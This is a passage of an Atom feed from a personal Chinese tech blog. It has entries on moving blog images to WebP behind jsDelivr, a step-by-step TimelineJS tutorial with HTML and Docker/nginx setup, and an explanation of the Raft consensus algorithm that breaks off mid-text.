<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>G2EX</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://g2ex.top/"/>
  <updated>2020-11-25T02:09:19.688Z</updated>
  <id>https://g2ex.top/</id>
  
  <author>
    <name>Yaming Gong</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WebP 更新</title>
    <link href="https://g2ex.top/2020/07/04/update-with-webp/"/>
    <id>https://g2ex.top/2020/07/04/update-with-webp/</id>
    <published>2020-07-04T17:34:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>腾出时间，把博客中的图片转换成了 WebP 格式。</p><p>同时，把图床从 imgur 换到了 Github，开启了 jsDelivr 加速。加速规则很简单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 假如 Bob 的 Github 账号中 Repo 仓库下有一张图片 path2pic.webp</span><br><span class="line"># 如果直接引用 Github 中的图片，链接为：</span><br><span class="line">https://github.com/Bob/Repo/blob/master/path2pic.webp</span><br><span class="line"></span><br><span class="line"># jsDelivr 加速后的链接为：</span><br><span class="line">https://cdn.jsdelivr.net/gh/Bob/Repo/path2pic.webp</span><br></pre></td></tr></table></figure><p>整理记录博客的过程，也是对自己成长的一次梳理。</p><p>二十岁，对互联网世界刚刚开始探索，每有新发现，折腾之余又乐于分享。分享时往往站在一个初入门的视角，难免有些拖沓冗余，从图片的使用量也能看出来，前期多于这几年。</p><p>三十多岁后，发现了技术的相通性，思想借鉴，用在新的场景下，就换成了一个新名词。新鲜东西的出现，总能看到历史上的影子，探索时也少有了年轻时的激情。</p><p>二十岁，痴迷技术，也从技术和新发现中获取成就感。三十多岁，发现技术只是技术，最感谢兴趣的其实是钱。</p><p>去年公司解散，同学帮忙内推到大厂，开启了 995 的工作，更没有时间来整理博客。今天腾出来时间整理一番，啰嗦一下以此纪念。</p><p>图片转换 WebP 写了个批量处理的脚本，附上<a href="https://github.com/gymgle/gnotes/blob/master/Python/pic2webp.py" target="_blank" rel="noopener">链接</a> 。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;腾出时间，把博客中的图片转换成了 WebP 格式。&lt;/p&gt;
&lt;p&gt;同时，把图床从 imgur 换到了 Github，开启了 jsDelivr 加速。加速规则很简单：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
      
    
    </summary>
    
    
      <category term="webp" scheme="https://g2ex.top/tags/webp/"/>
    
  </entry>
  
  <entry>
    <title>如何拥有一个漂亮的故事线</title>
    <link href="https://g2ex.top/2020/04/25/timelinejs/"/>
    <id>https://g2ex.top/2020/04/25/timelinejs/</id>
    <published>2020-04-25T20:21:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、背景介绍"><a href="#一、背景介绍" class="headerlink" title="一、背景介绍"></a>一、背景介绍</h2><p>最初发现 TimelineJS 是在 2014 年。为了制造一个惊喜，用它做了一个与爱人从相识到结婚的时间线。</p><p>转眼 2020，TimelineJS 也有了第三个版本。</p><p>对于平时有记录习惯的人来说，拥有一个关于自己的易读美观的故事线是一件非常有成就感的事，我自己便属于这类人。另一方面，TimelineJS 仍然非常小众，而且国内几乎没有对它的介绍和使用说明。本文的目的是便是能够把它的使用方法描述清晰。</p><h3 id="TimelineJS-能做什么"><a href="#TimelineJS-能做什么" class="headerlink" title="TimelineJS 能做什么"></a>TimelineJS 能做什么</h3><p>官网：<a href="https://timeline.knightlab.com/" target="_blank" rel="noopener">https://timeline.knightlab.com/</a></p><p>TimelineJS 是 Northwestern University Knight Lab 社区的一个产品，它可以用来制作时间线（时间轴）的故事，元素支持文本、图片、音乐、视频、地图。官网罗列出的类型包括：</p><blockquote><p>Twitter, Flickr, YouTube, Vimeo, Vine, Dailymotion, Google Maps, Wikipedia, SoundCloud, Document Cloud and more！</p></blockquote><p>在官网上能看到几个示例，比如对美国歌手惠特妮·休斯顿的生平介绍：<a href="https://timeline.knightlab.com/examples/houston/index.html" target="_blank" rel="noopener">https://timeline.knightlab.com/examples/houston/index.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2020-04-25_174900.webp" alt="whitneyhouston"></p><h3 id="本文适用的读者"><a href="#本文适用的读者" class="headerlink" title="本文适用的读者"></a>本文适用的读者</h3><p>TimelineJS 虽然适用简单，但如果你能够：</p><ul><li>懂点前端知识；</li><li>懂点网站托管知识；</li><li>最好熟悉 JSON 语法；</li><li>最好能科学上网（不会也没关系，一样可以本地使用）；</li></ul><p>那么，TimelineJS 对你来说毫无门槛。</p><h2 id="二、几种使用方法"><a href="#二、几种使用方法" class="headerlink" title="二、几种使用方法"></a>二、几种使用方法</h2><p>要想使用 TimelineJS 制作故事线，需要从以下两个方面考虑：</p><ul><li>故事线的数据存放到哪里</li><li>故事线的网页运行在哪里</li></ul><p>幸运的是，这两个方面官方都考虑到了，使用 Google docs 来存放故事线的数据，Knight Lab 提供页面托管。只要按照这里的 4 个步骤 <a href="https://timeline.knightlab.com/#make" target="_blank" rel="noopener">https://timeline.knightlab.com/#make</a> 就能生成 Knight Lab 给你的一个链接。对于想尝试一下的人来说，这样就足够了，简单么！</p><p>但是，它实际上是支持以下三种组合使用的：</p><ol><li><strong>Knight Lab + Google docs</strong>  # 官方推荐，需科学上网</li><li><strong>自己的页面 + Google docs</strong>  # 可个性化定制页面，需科学上网</li><li><strong>自己的页面 + JSON 文件</strong>      # 可个性化定制页面</li></ol><p>第一种是上面官方推荐的用法。对于想要个性化定制页面的用户来说，就需要使用后两种方法了。对于不能使用 Google 服务的用户来说，就只能选择第三种方法了。</p><p>从隐私方面来考虑，一旦使用 Google docs 这种组合，就意味着需要把文档公开，所以对于不想公开故事线信息的人来说，最好的办法就是使用本地的 JSON 文件，也就是第三种组合。</p><p>接下来详细介绍一下后两种组合的使用方法。</p><h2 id="三、详细使用"><a href="#三、详细使用" class="headerlink" title="三、详细使用"></a>三、详细使用</h2><h3 id="1-自己的页面-Google-docs"><a href="#1-自己的页面-Google-docs" class="headerlink" title="1. 自己的页面 + Google docs"></a>1. 自己的页面 + Google docs</h3><p>按照 <a href="https://timeline.knightlab.com/#make" target="_blank" rel="noopener">https://timeline.knightlab.com/#make</a> 这里前两个步骤：</p><p>第一步、点击 <a href="https://docs.google.com/spreadsheets/d/1pHBvXN7nmGkiG8uQSUB82eNlnL8xHu6kydzH_-eguHQ/copy" target="_blank" rel="noopener">这里复制一份时间线数据的表格模版</a>；</p><p>第二步、把你的表格发布到网络后，复制表格的 URL；</p><p>第三步、创建一个自己的 HTML 页面，把第 16 行的链接替换为你自己表格的 URL：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Timeline<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">title</span>=<span class="string">"timeline-styles"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">href</span>=<span class="string">"https://cdn.knightlab.com/libs/timeline3/latest/css/timeline.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.knightlab.com/libs/timeline3/latest/js/timeline.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'timeline-embed'</span> <span class="attr">style</span>=<span class="string">"width: 100%; height: 600px"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">        timeline = <span class="keyword">new</span> TL.Timeline(<span class="string">'timeline-embed'</span>,</span></span><br><span class="line"><span class="javascript">            <span class="string">'https://docs.google.com/spreadsheets/d/1cWqQBZCkX9GpzFtxCWHoqFXCHg-ylTVUWlnrdYMzKUI/pubhtml'</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样，在本地打开这个页面，就可以看到自己的故事线了。</p><h3 id="2-自己的页面-JSON-文件"><a href="#2-自己的页面-JSON-文件" class="headerlink" title="2. 自己的页面 + JSON 文件"></a>2. 自己的页面 + JSON 文件</h3><p>为了直接能从本地引用 timeline.js 和 css 文件，从这里 <a href="https://cdn.knightlab.com/libs/timeline3/latest/timeline3.zip" target="_blank" rel="noopener">https://cdn.knightlab.com/libs/timeline3/latest/timeline3.zip</a> 下载官方的编译后压缩包，解压到本地网页目录，重命名为 <code>build</code>。这时，你的网页目录应该是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── build</span><br><span class="line">    ├── css</span><br><span class="line">    │   ├── fonts</span><br><span class="line">    │   ├── icons</span><br><span class="line">    │   ├── themes</span><br><span class="line">    │   └── timeline.css</span><br><span class="line">    ├── embed</span><br><span class="line">    │   └── index.html</span><br><span class="line">    └── js</span><br><span class="line">        ├── library</span><br><span class="line">        ├── locale</span><br><span class="line">        ├── timeline-embed-cdn.js</span><br><span class="line">        ├── timeline-embed.js</span><br><span class="line">        ├── timeline-min.js</span><br><span class="line">        └── timeline.js</span><br></pre></td></tr></table></figure><p>接下来，创建一个时间线的 JSON 文件，可以直接下载 惠特妮·休斯顿 的<a href="https://github.com/NUKnightLab/TimelineJS3/blob/master/website/templates/examples/houston/timeline3.json" target="_blank" rel="noopener">示例</a>，放到网页目录中，重命名为 <code>data.json</code>。</p><p>接下来，创建一个 HTML 文件，名字为 <code>index.html</code>，内容如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Timeline<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"apple-mobile-web-app-capable"</span> <span class="attr">content</span>=<span class="string">"yes"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"apple-touch-fullscreen"</span> <span class="attr">content</span>=<span class="string">"yes"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- build:css https://cdn.knightlab.com/libs/timeline3/latest/css/timeline.css --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">title</span>=<span class="string">"timeline-styles"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"./build/css/timeline.css"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- endbuild --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- build:js https://cdn.knightlab.com/libs/timeline3/latest/js/timeline-min.js.js --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./build/js/timeline-min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- endbuild --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Style--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        html, body &#123;</span><br><span class="line">        height:100%;</span><br><span class="line">        padding: 0px;</span><br><span class="line">        margin: 0px;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"timeline-embed"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"timeline"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> embed = <span class="built_in">document</span>.getElementById(<span class="string">'timeline-embed'</span>);</span></span><br><span class="line"><span class="javascript">            embed.style.height = getComputedStyle(<span class="built_in">document</span>.body).height;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.timeline = <span class="keyword">new</span> TL.Timeline(<span class="string">'timeline-embed'</span>, <span class="string">'data.json'</span>, &#123;</span></span><br><span class="line"><span class="javascript">                hash_bookmark: <span class="literal">false</span></span></span><br><span class="line">            &#125;);</span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> embed = <span class="built_in">document</span>.getElementById(<span class="string">'timeline-embed'</span>);</span></span><br><span class="line"><span class="javascript">                embed.style.height = getComputedStyle(<span class="built_in">document</span>.body).height;</span></span><br><span class="line">                timeline.updateDisplay();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这时，你的页面目录结构应该为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── build</span><br><span class="line">│   ├── css</span><br><span class="line">│   ├── embed</span><br><span class="line">│   └── js</span><br><span class="line">├── data.json</span><br><span class="line">└── index.html</span><br></pre></td></tr></table></figure><p>如果本地直接打开 index.html，会在页面的调试工具中看到跨域的错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access to XMLHttpRequest at &apos;file:///path/to/your/data.json&apos; from origin &apos;null&apos; has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, chrome-extension, https.</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2020-04-25_194147.webp" alt="cors"></p><p>跨域错误的原因是 timeline.js 读取的 json 文件是本地文件，不是 http 这种 URL 的。要解决这个问题，可以考虑使用 http server 把页面托管起来。Windows 用户可以选择 <a href="https://chrome.google.com/webstore/detail/web-server-for-chrome/ofhbbkphhbklhfoeikjpcbhemlocgigb" target="_blank" rel="noopener">Web Server for Chrome</a> 扩展，把网页目录托管起来。当然 Linux 和 Mac 用户也可以这样用，既然你都用 Linux 或 Mac 了，就跟着我一起折腾吧。</p><p>接下来，我们尝试一下 Nginx 来托管静态页面，无需编译安装 Nginx，直接用 Docker 来运行即可。（前置条件：你要自己安装 Docker for Linux or Docker for Mac）</p><p>在网页目录新建一个 <code>start-nginx-docker.sh</code> 文件，内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name timeline-nginx -v $&#123;PWD&#125;:/usr/share/nginx/html -p 8080:80 -d nginx</span><br></pre></td></tr></table></figure><p>这时，你的网页目录应该是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── build</span><br><span class="line">│   ├── css</span><br><span class="line">│   ├── embed</span><br><span class="line">│   └── js</span><br><span class="line">├── data.json</span><br><span class="line">├── index.html</span><br><span class="line">└── start-nginx-docker.sh</span><br></pre></td></tr></table></figure><p>在该目录下，运行 <code>sh start-nginx-docker.sh</code> 命令，会自动下载 Nginx 最新的镜像并运行。</p><p>打开 <a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a> 就能浏览了。</p><p>剩下的事，就是去修改你的 json 文件。</p><p>TimelineJS 的 JSON 中字段的意思都在这里进行了说明 <a href="https://timeline.knightlab.com/docs/json-format.html" target="_blank" rel="noopener">https://timeline.knightlab.com/docs/json-format.html</a></p><h2 id="四、个性化页面"><a href="#四、个性化页面" class="headerlink" title="四、个性化页面"></a>四、个性化页面</h2><h3 id="自定义字体"><a href="#自定义字体" class="headerlink" title="自定义字体"></a>自定义字体</h3><p>TimelineJS 提供了几个预选字体集，如果使用内置的字体，可以在 HTML 中这样写：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">title</span>=<span class="string">"timeline-styles"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdn.knightlab.com/libs/timeline3/latest/css/timeline.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">title</span>=<span class="string">"timeline-styles"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdn.knightlab.com/libs/timeline3/latest/css/fonts/font.abril-droidsans.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>font.abril-droidsans.css 可以替换为下面其他的字体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">font.abril-droidsans.css</span><br><span class="line">font.amatic-andika.css</span><br><span class="line">font.bevan-pontanosans.css</span><br><span class="line">font.bitter-raleway.css</span><br><span class="line">font.clicker-garamond.css</span><br><span class="line">font.dancing-ledger.css</span><br><span class="line">font.default.css</span><br><span class="line">font.fjalla-average.css</span><br><span class="line">font.georgia-helvetica.css</span><br><span class="line">font.knightlab.css</span><br><span class="line">font.lustria-lato.css</span><br><span class="line">font.medula-lato.css</span><br><span class="line">font.oldstandard.css</span><br><span class="line">font.opensans-gentiumbook.css</span><br><span class="line">font.playfair-faunaone.css</span><br><span class="line">font.playfair.css</span><br><span class="line">font.pt.css</span><br><span class="line">font.roboto-megrim.css</span><br><span class="line">font.rufina-sintony.css</span><br><span class="line">font.ubuntu.css</span><br><span class="line">font.unicaone-vollkorn.css</span><br></pre></td></tr></table></figure><h3 id="自定义选项"><a href="#自定义选项" class="headerlink" title="自定义选项"></a>自定义选项</h3><p>定义 <code>additionalOptions</code> 并在实例化 Timeline 的时候作为第三个参数传入。详细的个性化选项可以参考 <a href="https://timeline.knightlab.com/docs/options.html" target="_blank" rel="noopener">https://timeline.knightlab.com/docs/options.html</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> additionalOptions = &#123;</span></span><br><span class="line"><span class="javascript">        start_at_end: <span class="literal">true</span>,</span></span><br><span class="line">        default_bg_color: &#123;</span><br><span class="line">            r: 0,</span><br><span class="line">            g: 0,</span><br><span class="line">            b: 0</span><br><span class="line">        &#125;,</span><br><span class="line">        timenav_height: 250</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    timeline = <span class="keyword">new</span> TL.Timeline(<span class="string">'timeline-embed'</span>,</span></span><br><span class="line"><span class="javascript">        <span class="string">'https://docs.google.com/spreadsheets/d/1cWqQBZCkX9GpzFtxCWHoqFXCHg-ylTVUWlnrdYMzKUI/pubhtml'</span>,</span></span><br><span class="line">        additionalOptions);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="五、还有什么"><a href="#五、还有什么" class="headerlink" title="五、还有什么"></a>五、还有什么</h2><p>页面 + JSON 文件方式除了可以本地浏览，也可以部署到网络上，比如 github pages。</p><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><p>官方文档 <a href="https://timeline.knightlab.com/docs/index.html" target="_blank" rel="noopener">https://timeline.knightlab.com/docs/index.html</a></p><p>HTML中使用 TimelineJS <a href="https://timeline.knightlab.com/docs/instantiate-a-timeline.html" target="_blank" rel="noopener">https://timeline.knightlab.com/docs/instantiate-a-timeline.html</a></p><p>Timeline JSON 字段说明 <a href="https://timeline.knightlab.com/docs/json-format.html" target="_blank" rel="noopener">https://timeline.knightlab.com/docs/json-format.html</a></p><p>Timeline 个性化选项说明 <a href="https://timeline.knightlab.com/docs/options.html" target="_blank" rel="noopener">https://timeline.knightlab.com/docs/options.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、背景介绍&quot;&gt;&lt;a href=&quot;#一、背景介绍&quot; class=&quot;headerlink&quot; title=&quot;一、背景介绍&quot;&gt;&lt;/a&gt;一、背景介绍&lt;/h2&gt;&lt;p&gt;最初发现 TimelineJS 是在 2014 年。为了制造一个惊喜，用它做了一个与爱人从相识到结婚的时间线
      
    
    </summary>
    
    
      <category term="timeline" scheme="https://g2ex.top/tags/timeline/"/>
    
      <category term="js" scheme="https://g2ex.top/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>理解 Raft 分布式共识算法</title>
    <link href="https://g2ex.top/2019/09/17/understanding-raft/"/>
    <id>https://g2ex.top/2019/09/17/understanding-raft/</id>
    <published>2019-09-17T20:30:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>最近两年工作中对区块链技术接触较多，接下来可能要告一段落了。期间对 go-ethereum 进行过联盟链改造，使用 Raft 共识算法把以太坊的 TPS 提升到了 1K+。这里总结一下 Raft 算法，既是对自己经历对一种记录，也算是对他人对帮助。</p><p>Raft 算法是一个非常好理解（相比 Paxos 算法来说），也是一个非常受欢迎的共识算法，比如常用的服务发现、共享配置以及一致性保障的 etcd 和 Counsul 都使用了 Raft 算法来保证一致性。</p><h2 id="0x01-什么是分布式共识算法"><a href="#0x01-什么是分布式共识算法" class="headerlink" title="0x01 什么是分布式共识算法"></a>0x01 什么是分布式共识算法</h2><p>在分布式计算领域中有一个非常有名的 CAP 定理：一个分布式系统最多只能同时满足一致性（Consistency）、可用性（Availability）和分区容忍性（Partition tolerance）这三项中的两项。</p><p>一致性是指节点数据的一致，即所有节点在同一时间的数据完全一致。如果细分的话，一致性又可以分为强一致、弱一致和最终一致。比如我们经常使用的多副本关系型数据库满足的是强一致性，又因为要同时满足高可用，那么就弱化了分区容忍性（可以使用简单的网络拓扑来减少分区出错的可能）；公有的比特币、以太坊网络是属于最终一致，因为它们必须优先满足可用性和分区容忍性。</p><p>分布式网络中所有节点要想达成一致，就需要一个算法来促成这个一致，这个算法就是共识算法。我们常听说的 挖矿、PoS、DPoS、PBFT、Raft 都属于解决一致性的算法。</p><h2 id="0x02-理解-Raft"><a href="#0x02-理解-Raft" class="headerlink" title="0x02 理解 Raft"></a>0x02 理解 Raft</h2><p>Raft 中，节点通过心跳消息来保持通信，一个节点只会处于以下三种状态中的一种：</p><ul><li>Follower（跟从者）</li><li>Candidate（候选人）</li><li>Leader（领导者）</li></ul><p>最开始时，所有的节点都是 follower，如果 follower 收不到 leader 的心跳消息，那么 follower 会变为 candidate，并向其他节点发起投票，如果该 candidate 节点收到了半数以上的选票（包括投给自己的一票），那么它就当选为新的 leader。这个过程被称为 <strong>leader 选举</strong>的过程。</p><p>接下来，leader 节点将带领所有节点对分布式网络中对数据更改达成一致，这个过程被称为<strong>日志同步</strong>。</p><p>日志同步的过程如下：</p><ol><li>Leader 收到客户端到数据提交请求，leader 把请求作为一个条目（entry）加入到它到日志中，这个时候它不会立刻更新数据；</li><li>Leader 向所有的 followers 节点发送这个条目，这个发送的过程被称为 Append Entries；</li><li>Followers 节点收到 leader 的 Append Entries 请求后，向 leader 回复条目响应；</li><li>Leader 节点收集了半数以上的条目响应后，向客户端响应条目已确认，这时它才会更新自身节点的数据，同时向所有 fwllowers 节点发送条目确认的消息；</li></ol><h2 id="0x03-特殊情况"><a href="#0x03-特殊情况" class="headerlink" title="0x03 特殊情况"></a>0x03 特殊情况</h2><p><strong>Leader 选举过程中，如果没有收到半数以上的选票，该怎么办？</strong></p><p>Raft 中，有两种超时机制：选举超时和心跳超时。</p><p>每个 follower 会随机生成一个选举超时时间。任意节点当自身的选举超时时间结束后还没有收到 leader 的消息，那么它就重置这轮选举，变为 candidate 向其他节点发起新一轮投票。这样，最终总会选举出一个 leader 节点来。</p><p><strong>正常运行过程中，如果 leader 节点挂掉，会出现什么情况？</strong></p><p>这种情况下，会用到心跳超时机制。当 followers 